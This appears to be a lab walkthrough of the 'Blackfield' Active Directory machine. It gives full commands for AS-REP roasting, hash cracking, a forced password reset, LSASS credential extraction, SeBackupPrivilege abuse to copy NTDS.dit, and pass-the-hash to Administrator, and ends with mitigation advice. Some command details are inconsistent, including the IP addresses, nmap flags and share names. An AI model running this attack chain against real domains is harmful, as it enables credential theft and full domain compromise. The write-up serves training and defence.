---
title: 'Blackfield Machine Walkthrough'
keywords: []
excerpt: "Blackfield is a hard machine that demonstrates how weak authentication, misconfigurations in Kerberos of Active Directory, and abuse of built-in Windows user account permissions can be chained to result in the complete compromise of an Active Directory domain."
layout: single
header:
  image: /assets/images/Blackfield/Blackfield.png
toc: true
toc_label: "Table of Contents"
sidebar:
  nav: "sidebar"
---

Blackfield is a hard difficulty machine running the Microsoft Windows OS and demonstrates how a simple compromise of a low - privileged AD domain user account combined with inadequate password management can result in the full compromise of an AD domain.

## Attack Path Summary

A summary of the attack path is as follows:

* A user account was found to not require Kerberos preauthentication making the account vulnerable to the [AS-REP roasting attack](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/). As a result, I was able to obtain the Kerberos pre-authentication password hash of this AD user account and crack it offline to reveal the plaintext password.
* Further enumeration via Bloodhound tool revealed the account above had permissions to change the password of another domain user account which I did.
* The second compromised account has access to a file share which contains a memory dump of the process Local Security Authority Subsystem Service (LSASS). The LSASS contains the NTLM hash of the service account svc_backup.
* The svc_backup account has the powerful access privilege of SeBackUpPrivilege which allows the bypassing of file and directory access permissions to backup these resources. I was able to obtain a copy of the NTDS.DIT database which holds all of the password hashes for all users in the AD domain. After a pass the hash attack, I fully escalate my permissions to ADMINISTRATOR user.

![Machine exploitation matrix](/Pen-testing-blog/assets/images/Blackfield/ExploitationMatrix.png "Figure 1 - Machine exploitation matrix")

## Step 1 - Enumeration

As always, I begin with enumeration of the remote machine with the goal of gathering as much information as I can about it such as open ports, services running on the open ports, and operating system type and version. I will use the network scanner, **nmap.**

### Enumerating with Nmap

I first run a scan to discover open ports per Figure 2 below and then run the service detection scan and default set of nmap enumeration scripts only on those open ports for greater efficiency as show in Figure 3. Explanation of flags:

* -p — Ports on remote machine to scan
* -n — Do not resolve DNS
* -sC — run default set of nmap enumeration scripts
* -sV — Detect services running on the open ports
* -T4 — Scan in aggressive mode to speed up the scan results

```bash
nmap 10.10.11.108 -p- -T4

nmap 10.10.11.108 -p 53,88,135,139,389,445,593,3268,5985 -sC, sV, -n -T4
```

![Nmap scan 1](/Pen-testing-blog/assets/images/Blackfield/NmapScan1.png "Figure 2 - Nmap scan output 1")

![Nmap scan 2](/Pen-testing-blog/assets/images/Blackfield/NmapScan2.png "Figure 3 - Nmap scan output 2")

The Nmap output shows the following:

* The machine is a Windows OS and is a an Active Directory domain controller due to the ports open and the services running on those ports.
* Dynamic name resolution (DNS) service is running on default port of 53.
* Kerberos authentication protocol is running on default port 88.
* Remote procedure call (RPC) service running on default port 135
* Server messaging block (SMB) for network resource sharing is running on default port of 445 and also on port 139 via the NetBios service
* Lightweight directory access protocol (LDAP) is active on default port 389 and 3268 for running unencrypted LDAP and the LDAP service communicating with the AD Global Catalog.
* Windows remote management (WinRM) service over HTTP is active on default port of 5985.

### Enumerating SMB with guest account and null binds - Port 445

The first service I explore is SMB over port 445 using tools of smbmap and Crackmap Exec (NetExec). I begin by testing to see if SMB null authentication is enabled. Per Figure 4, I was able to enumerate the file shares using a null bind via the **SMBMap** tool, confirming SMB null authentication is enabled. Explanation of flags is as follows:

* -H - Specify the IP address of the machine to map SMB files share from
* -u - Specify the username to authenticate as (in this case null authentication)

```bash
smbmap -H 10.10.10.192 -u null
```

![Smb null authentication enabled](/Pen-testing-blog/assets/images/Blackfield/SmbNullAuthenticationEnabled.png "Figure 4 - SMB null authentication enabled")

I connect to the profiles$ share using the tool **smbclient** and discover the share contains several hundred directories with what appears to be user names per Figure 5 below.

Explanation of flags is as follows:

* -N - Specify the IP address of the machine to containing SMB file to connect and the file name share itself

```bash
smbclient -N //10.10.10.192/profiles$
```

![Listing of directories in the $profiles file share](/Pen-testing-blog/assets/images/Blackfield/ProfilesShareListing.png "Figure 5 - Profiles$ file share listing")

Due to the large number of directories, I will be using the tool of CrackMap Exec in super_spidering mode to automatically spider all file shares I can access and see how many files are in each of the directories shown in Figure 5 previously. Per Figure 6, there are a total of 314 directories but they are all empty. Explanation of flags is as follows:

* -u - Specify the user to authenticate as (guest as empty string will not work)
* -p - Specify the password of the account to authenticate as (Specify blank string to leave blank)
* -M - Specify the mode to operate in (Select super_spider)

```bash
nxc smb 10.10.10.192 -u guest -p '' -M super_spider
```

![File shares spidering results](/Pen-testing-blog/assets/images/Blackfield/SMBSuperSpideringResults.png "Figure 6 - File shares spidering results")

At this point, I decide to build a list of usernames to test if any of the AD accounts have the setting **Do not require Kerberos preauthentication** enabled which makes the account vulnerable to an AS-REP roasting attack. The command I used to generate the user list  and the explanation of syntax is as follows. The outcome is shown in Figure 7 below.

* smbclient -N //10.10.10.192/$profiles - Connect to the $profiles share using a null session over the smb protocol
* -c ls - run the ls command immediately after connecting to the share to list the file directories
* awk '{print $1}' - Using the awk command to only print the first field containing the AD user account names
* users.txt - Redirect the output to a file named users.txt in the current working directory (> symbol is to redirect output)

```bash
smbclient -N //10.10.10.192/$profiles -c ls | awk '{print $1}' > users.txt
```

![User account listing](/Pen-testing-blog/assets/images/Blackfield/UserListing.png "Figure 7 - AD user account listing")

### Enumerating LDAP with a null bind - Port 389

Before I test to see if any of the AD user accounts can be compromised via AS-REP roasting, I complete enumeration phase by enumerating LDAP with a null bind on port 389. The first step is obtaining the base naming context of the AD domain. Using the **ldapsearch** tool, the syntax is as follows. Output with base naming context highlighted is shown in Figure 8.

* -H - Specify the IP address of the LDAP server to search
* -x - Specify that simple authentication is to be used to bind to the LDAP server
* -s - Specify the search scope and what to search for from the base of the LDAP directory (namingcontexts)

```bash
ldapsearch -H ldap://10.10.10.192 -x -s base namingcontexts
```

![Obtaining LDAP base naming context](/Pen-testing-blog/assets/images/Blackfield/LDAPBaseNamingContexts.png "Figure 8 - Obtaining LDAP base naming context")

Unfortunately, I am unable to enumerate any AD domain objects starting from the base naming context without credentials per Figure 9 below.

* -H - Specify the IP address of the LDAP server to search
* -x - Specify that simple authentication is to be used to bind to the LDAP server
* -b - Specify the location in the AD domain to begin searching (in this case enter the base naming context)

```bash
ldapsearch -H ldap://10.10.10.192 -x -b "DC=blackfield,DC=local"
```

![LDAP enumeration failure with no credentials](/Pen-testing-blog/assets/images/Blackfield/LDAPBindFailureNoCredentials.png "Figure 9 - LDAP search failure with null bind")

## Step 2 - Gaining initial foothold as Support - AS-REP Roasting

I've reached the limit of what I can enumerate on the AD domain with no credentials. I next will use an attack known as [AS-REP roasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/) with the list of AD user accounts compiled earlier to see if any of them has the "Do No require Kerberos preauthentication" option enabled, allowing me to steal the Kerberos pre-authentication hash of the account password contained in the Kerberos authentication response (AS_REP) for offline cracking. A brief overview of how AS-REP roasting works is as follows:

* A malicious actor with access to a domain controller on the network sends an authentication service request (AS-REQ) to the key distribution center (KDC) component of Kerberos protocol on the domain controller requesting a ticket granting ticket (TGT) for AD domain user accounts.
* Usually, the KDC would refuse such a request unless the requester first provides his / her AD account password to prove identity, a requirement known as pre-authentication.
* However, if the option "Do not require Kerberos pre-authentication is enabled, Kerberos will not require the user requesting the TGT to authenticate via his / her password first   and **will grant the TGT for any user making the request and send it back to the requesting client as part its authentication service response - AS_REP** The AS-REP is consists of an encrypted timestamp generated from the password of the client account making the AS-REQ request.
* The Kerberos pre-authentication password hash is cracked offline using brute techniques.

### AS-REP roasting via GetNPUsers.py script

 I run the GetNPUsers.py Python script from [Impacket scripts](https://www.kali.org/tools/impacket-scripts/) via the below syntax to filter the result for "krgbtasrep" to locate all AD accounts that have Kerberos pre-authentication disabled. Per Figure 10 below, the AD domain account **Support** is found to be vulnerable which reveals its Kerberos password hash. Explanation of syntax is as follows:

* blackfield.local - Specify the name of the domain
* -dc-ip - specify the IP address of the AD domain containing the user accounts to target for AS-REP roasting
* -request - Request a TGT ticket ticket for each AD user account to test
* -no-pass - do not prompt for a password
* -userslist - specify the file containing list of AD domain user accounts to test
* -format - Specify the format to output results (such as john or Hashcat)
* grep - krb5asrep - filter the results for the AS-REP indicating the account that does not have Kerberos preauthentication enabled

```bash
impacket-GetNPUsers.py blackfield.local/ -dc-ip 10.10.10.192 -request -no-pass -userslist users.txt -format hashcat | grep krb5asrep
```

![Support service account susceptible to AS-REP roasting attack](/Pen-testing-blog/assets/images/Blackfield/KerberosPasswordHashObtained_service.png "Figure 10 - Kerberos password hash captured for support service account due to successful AS-REP roasting attack")

### Cracking Kerberos hash to obtain plaintext password of Support service account

The next step after obtaining the Kerberos password hash is to crack it offline to obtain the plaintext password of the Support account Service for which I will use the Hashcat tool. The input is shown in Figure 11 and output in Figure 12. Explanation of syntax is as follows:

* -a - Specify the hash cracking mode. Select 0 in this case for a dictionary or straight attack
* -m - Specify the type of hash to crack. Use 18200 as the hash type is a Kerberos password hash derived from the AS-REP reponse
* 'Hash to crack' - Enter the hash to be cracked from the output of the Impacket Get-NPUsers.py Python script. Note: this will be different for easch player each iteration
* /usr/share/wordlists/rockyou.txt - Enter the wordlist to use to crack the hash. While I used the well know Rockyou.txt file here, many other wordlists can be used
* -o - Specify the output file to write the cracked password to

```bash
hashcat -a 0 -m 18200 'hash to crack' /usr/share/wordlists/rockyou.txt -o crack_service_password_hash.txt
```

![Hashcat input for cracking support service account Kerberos password hash](/Pen-testing-blog/assets/images/Blackfield/Service_password_hash_HashCat_input.png "Figure 11 - Hashcat program input for cracking Kerberos password hash for Support service account")

![Kerberos password hash cracked for service account support](/Pen-testing-blog/assets/images/Blackfield/Service_password_hash_cracked_HashCat.png "Figure 12 - Support service account Kerberos password hash cracked")

## Step 3 - Lateral Movement to Audit2020 - Force Password Reset

After compromising the Support service account, I begin to move laterally to other assets on the AD domain. The first step is to check what access rights the support service account has with CrackMap Exec tool (net exec tool) for all services: Shell access via Windows remote management functionality, additional file share access via SMB, and additional ability to enumerate AD objects via LDAP. Per screenshots 13 - 15 below, all fails or yields nothing of interest to me.

### Enumerating additional access via SMB, LDAP, and WinRM - Failure

The first service I check access for is WinRM to see if I can get a shell login onto the AD domain. Per Figure 13 below, support service account does not have access to spawn a shell via windows remote access (WinRM) service.

```bash
nxc smb 10.10.10.192 -u support -p '#00^BlackKnight'
```

![Support service account no access to WinRM](/Pen-testing-blog/assets/images/Blackfield/ServiceAccountNoWinRMAccess.png "Figure 13 - Support service account does not have access to WinRM service")

I next move on to check if these new credentials provided me with additional access to file shares that were inaccessible before. Per Figure 14 below, I was able to gain read access to the NETLOGON and SYSVOL file shares. However, neither of these shares contained anything useful for me such as credentials per Figures 15 below.

```bash
smbmap 10.10.10.192 -u support -p '#00^BlackKnight'
```

![Support service account with read access to NETLOGON and SYSVOL file sharesM](/Pen-testing-blog/assets/images/Blackfield/AccessToNETLOGONSYSVOL_supportServiceAccount.png "Figure 14 - Support service account has read access to NETLOGON and SYSVOL file shares")

![Nothing useful on NETLOGON and SYSVOL file shares](/Pen-testing-blog/assets/images/Blackfield/SMBShares_NETLOGON_SYSVOL_NothingUseful.png "Figure 15 - Nothing useful on NETLOGON and SYSVOL file shares")

The final service I check is LDAP. Per snippet of output in Figure 16, while I was able to obtain the name of the domain controller as DC01, there was nothing else interesting in the output of domain object enumeration. Explanation of flags is as follows:

* -H - Specify the IP address of the LDAP server to search
* -x - Specify that simple authentication is to be used to bind to the LDAP server
* -b - Specify the location in the AD domain to begin searching (in this case enter the base naming context)
* -D - Specify the distinguished name of the AD domain object to bind to
* -w - Specify the password of the AD domain object used for LDAP bind

```bash
ldapsearch -H ldap://10.10.10.192 -x -b "DC=blackfield,DC=local" -D support@Blackfield.local -w '#00^BlackKnight'
```

![Nothing useful in LDAP output](/Pen-testing-blog/assets/images/Blackfield/LDAPOutPut_NotUseful.png "Figure 16 - Nothing useful in LDAP output")

### Enumerating the AD domain via Bloodhound tool

As enumeration of new file shares and LDAP failed to yield a way to move laterally to other assets on the domain, I decided to enumerate the relationship of all domain objects using the [Bloodhound tool](https://www.kali.org/tools/bloodhound/) with the Python based [Bloodhound.py ingestor script](https://www.kali.org/tools/bloodhound.py/), although other ingestors, such as SharpHound, can also be used.  The syntax for running the script is below and output is shown in Figure 16.

* -c - Specify the collection method - Choose all for collect everything
* -u - Enter the user account to authenticate as
* -p - Enter the password of the user account to authenticate as
* -d - Enter the name of the AD domain to authenticate to
* -dc - Enter the domain controller to authenticate to
* -ns - Enter the IP address of the DNS controller where the AD domain resides

```bash
bloodhound.py -c all -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
```

![Bloodhound Python ingestor output](/Pen-testing-blog/assets/images/Blackfield/Bloodhound_Python_ingestor_output.png "Figure 16 - Bloodhound Python ingestor output")

After uploading the zip file output into Bloodhound for analysis, I discover the Support service account can change the password of AD domain user account Audit2020 per Figure 17.

![Support change password for Audit2020](/Pen-testing-blog/assets/images/Blackfield/Support_change_password_Audit2020.png "Figure 17 - Support change password for Audit2020 AD account")

### Changing the Audit2020 account password via Remote Desktop Protocol - RDP

I will go ahead and use the RPC protocol to change the AD account password for the Audit2020 account, following [this guide here](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword.) However, I first check the password policy of the Blackfield domain using crackmapexec to set an appropriate password. The AD domain password policy is shown in Figure 18.

```bash
nxc smb -u support -p '#00^BlackKnight' --pass-pol
```

![Blackfield domain password policy](/Pen-testing-blog/assets/images/Blackfield/Blackfield_password_policy.png "Figure 18 - Blackfield AD domain password policy")

I connect to the compromised AD domain as support user via **rpcclient** tool and change the password for Audit2020 to something of my choice that complies with the domain password policy, in this case **Password123** , by issuing the command **setuserinfo2** The value of the 2nd parameter being 23 tells the security account manager protocol (SAM) how to interpret the string value that follows, in this case as the account password. [See details here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)

![Successfully changed domain password for Audit2020 AD account](/Pen-testing-blog/assets/images/Blackfield/Successfully_changed_password_Audit2020_account.png "Figure 19 - Successfully changed password for Audit2020 AD domain account")

## Step 4 - Lateral Movement to Svc_Backup - LSASS dump and NTLM hash extraction

### Enumerating new access as Audit2020 AD domain user

As in step 3, I first confirm whether the newly compromised account has access to spawn a remote shell via WinRM. Per Figure 20, the Audit2020 account does not have WinRM access, but does have R- access to the Forensic file share.

```bash
nxc winrm 10.10.10.192 -u audit2020 -p 'Password123'
nxc smb 10.10.10.192 -u audit2020 -p 'Password123' --shares
```

![Audit2020 AD account with access to Forensic file share but not winrm](/Pen-testing-blog/assets/images/Blackfield/Audit2020_access_Forensic_file_share.png "Figure 20 - Audit2020 AD domain account has access forensic file share but not WinRM")

After connecting to and enumerating the Forensic file share, I discover a local security authority subsystem service (LSASS) process dump in the memory_analysis folder. This file is a goldmine of information as it contains authentication credentials in Windows system memory for all users and processes at the time the process dump is taken. Please reference Figure 21 below.

![Lsass process dump file found](/Pen-testing-blog/assets/images/Blackfield/Blackfield_Lsass_dump.png "Figure 21 - Lsass process dump file found")

### Extracting NTLM hash for svc_backup AD account from Lsass process dump file

After extracting the Lsass.DMP dump file from the zip file, I use the tool of [Pypykatz.py](https://github.com/skelsec/pypykatz) to extract the various credentials for the different user accounts present in system memory, althou Per command output in Figure 22, one of the credentials, in the form of a NTLM password hash, was found for the **svc_backup** AD domain account.

```bash
pypykatz lsa minidump lsass.DMP
```

![NTLM hash found for svc_backup AD domain account](/Pen-testing-blog/assets/images/Blackfield/lsass_dump_svc_backup_NTLM_hash_extraction.png "Figure 22 - NTLM hash found for svc_backup AD domain account from lass process dump file")

The hash is found to work for both SMB and WinRM upon validation with CrackMapExec per Figure 23 below.

```bash
nxc smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
nxc winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![NTLM hash for svc_backup account work for both smb and WinRM](/Pen-testing-blog/assets/images/Blackfield/NTLM_hash_svc_backup_work_SMB_WinRM.png "Figure 23 - NTLM hash for svc_backup account work for both smb and WinRM")

Using a pass the hash (PTH) attack, I was able to login as the service account svc_backup per Figure 23 below. Summary of syntax is as follows:

* -i - Specify the IP address of the compromised AD domain to login to
* -u - Specify the username of the account to login as (in this case AD account name)
* -H - Specify the NTLM hash of the user account to login as

```bash
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![Login as service account svc_backup](/Pen-testing-blog/assets/images/Blackfield/Login_as_svc_backup.png "Figure 24 - Login as svc_backup")

## Step 5 - Privilege escalation to Administrator - NTDS.DIT file exfiltration

### Enumerating account privileges for svc_backup

One of the first tasks I like to do when I compromise a new AD account is to find out what access privileges the account has, something I can do with the command whoami /all. The output is shown in Figures 25 and 26 below.

![AD security group membership for svc_backup account](/Pen-testing-blog/assets/images/Blackfield/svc_backup_AD_account_security_groups.png "Figure 25 - AD security groups for svc_backup account")

![AD account privileges for svc_backup account](/Pen-testing-blog/assets/images/Blackfield/svc_backup_AD_account_privileges.png "Figure 26 - Account privileges for svc_backup AD account")

### Using Disk Shadow to create volume shadow copy of the system C:\ drive

The account privilege of [SeBackup privilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) immediately stands out to me as AD domain accounts with this privilege can read all files on the AD domain regardless of whether the account has individual read access to specific files in order to back up those files.  The all - powerful ntds.dit file (Active Directory database) contains the password hashes of all accounts on the AD domain. This file is always locked so I cant copy it directly, but can use the native Windows tool [DiskShadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) to create a volume shadow copy and read the file from the copy.

I create a simple text file, shadowcopy.txt, containing the below lines. Please see Figure 27 below.

* set context persistent nowriters - Do not delete shadow copy on DiskShadow program exit and disable all writers for speed and stealth
* add volume C: alias LZ - Add the C: drive to the volume shadow copy backup under the alias of LZ.
* create - Create the volume shadow copy
* expose %LZ% E: - Mount the volume shadow copy at mount point of drive E: (freely chosen)

As I am creating this script on a Linux based system but will be running it on a Windows based system, I run the conversion program, **unix2dos** to ensure line ending compatbility before uploading it to the compromised AD domain  in a working directory that I have write access to like ProgramData. Please reference Figure 28 below.

```bash
set context persistent nowriters
add volume C: alias LZ
create
expose %LZ% E
```

![Volume shadow copy script created](/Pen-testing-blog/assets/images/Blackfield/VSS_Shadow_Copy_script.png "Figure 27 - volume shadow copy script created")

![Volume shadow copy script loaded on compromised AD domain](/Pen-testing-blog/assets/images/Blackfield/VSS_Shadow_Copy_script_compromised_AD_Domain.png "Figure 28 - Volume shadow copy script loaded onto compromised AD domain")

After running the above script, the volume shadow copy of the C:/ drive is created and mounted as E:/ per Figure 29 below.

![Volume shadow copy creation of C:/ drive successful](/Pen-testing-blog/assets/images/Blackfield/Volume_shadow_copy_created_successfully.png "Figure 29 - Volume shadow copy of C:/ drive successful")

### Extracting the ntds.dit and system hive registry key via native Robocopy Windows tool

The creation of the volume shadow copy allows me to freely read and copy any file that I want, including files that were locked in the original C:/ drive such as ntds.dit. I will use the native Windows tool of Robocopy to copy this file to my original working directory and then download it to my Kali Linux machine. See Figures 30 and 31 below. Syntax of RoboCopy command to use is as follows:

* "E:\Windows\ntds" - Specify the file directory where ntds.dit file lives to copy from
* "C:\Programdata" - Specify the destination to copy the ntds.dit file to
* -b - Specify that Robocopy should perform the copy in the context of the SeBackup Privilege and ignore file level access permissions on the file

```bash
robocopy "E:\Windows\ntds" "C:\Programdata" ntds.dit -b
```

![Copying of ntds.dit file using Robocopy tool](/Pen-testing-blog/assets/images/Blackfield/Robocopy_syntax_ntds.dit.png "Figure 30 - ntds.dit file copied via Robocopy tool")

![Ntds.dit file downloaded to Kali machine](/Pen-testing-blog/assets/images/Blackfield/ntds.dit_file_downloaded.png "Figure 31 - ntds.dit file downloaded from compromised AD domain")

The ntds.dit file is encrypted with the boot key stored in the SYSTEM hive of the Windows registry at Hkey_Local_Machine\System. Therefore, I also copy the system hive from the following registry key **HKLM\system** to my working directory using the reg save method and download it to my Kali machine per Figures 32 and 33 below. The syntax is as follows:

* hklm\system - Specify the location of the registry hive to copy - location of the system hive
* C:\Programdata\system.hiv - Specify the destination to save the copied system hive. Choose an appropriate file type such as .hiv (hive file)

![Copying the system hive in registry to working directory](/Pen-testing-blog/assets/images/Blackfield/System_hive_copied.png "Figure 32 - System hive copied to working directory")

![System file downloaded to Kali machine](/Pen-testing-blog/assets/images/Blackfield/System_hive_downloaded.png "Figure 33 - System hive downloaded from compromised AD domain")

### Dumping password hashes using Secretsdump.py script and performing PTH attack

The final step to escalating my access to Administrator is to dump the password hashes in ntds.dit file and perform a pass the hash attack (PTH) using the Administrator AD account password hash. I will use the secretsdump.py Python script from the [impacket scripts](https://www.kali.org/tools/impacket-scripts/) set of tools with below syntax. Please see Figure 34 for command output showing the NTLM password hash for the Administrator AD domain account highlighted.

* -ntds - specify the ntds.dit file containing the AD account password hashes
* -system - Specify the system hive file containing the boot key needed to decrypt the ntds.dit file
* -Just-dc-ntlm - Filter results for only NTLM hashes for cleaner reading
* Local - Specify that the script is to parse the ntds.dit and system hive files on the local computer (My Kali Linux box) rather than remotely from the compromised AD domain

```bash
impacket-secretsdump -ntds ntds.dit -system system.hiv -just-dc-ntlm local
```

![Password hashes dumped from ntds.dit file](/Pen-testing-blog/assets/images/Blackfield/Password_hashes_dumped_ntds.dit.png "Figure 34 - AD account password hashes dumped from ntds.dit file")

A simple pass the hash attack via evil-winrm Windows remote management simulator fully escalates my access privileges to Administrator per Figure 35 below. Syntax is as follows:

* -i Specify the IP address of the compromised AD domain to log in to
* -u - Specify the user account on the compromised AD domain to login as
* -H - Specify the NTLM hash for Administrator AD account obtained from the ntds.dit file

```bash
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53899ee
```

![Privilege escalation to Administrator](/Pen-testing-blog/assets/images/Blackfield/Privilege_escalation_Administrator.png "Figure 35 - Privilege escalation to Administrator via PTH attack")

## Vulnerabilities - Exploitation and Mitigation Summary

The machine demonstrated the following vulnerabilities and how they can be exploited. I've also included some security controls that can mitigate exploitation.

### Broken authentication - Disabled Kerberos preauthentication

When an AD account has the setting of Kerberos preauthentication disabled, the account is susceptible to AS-REP roasting attacks where the KDC on the domain controller will respond with a ticket granting ticket (TGT) for any individual making an authentication request without verifying identity first.  As a result of the Support AD account having Kerberos preauthentication disabled, I was able to obtain a TGT for the account without knowing the account password, and subsequently crack the password hash offline.

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Do not disable Kerberos preauthentication unless absolutely needed for your use case.
* Implement strong password policies that include minimum length and complexity
* Consider implementing multi-factor authentication so even if malicious actors obtain your password, they will need an additional method of identity to gain unauthorized account access.
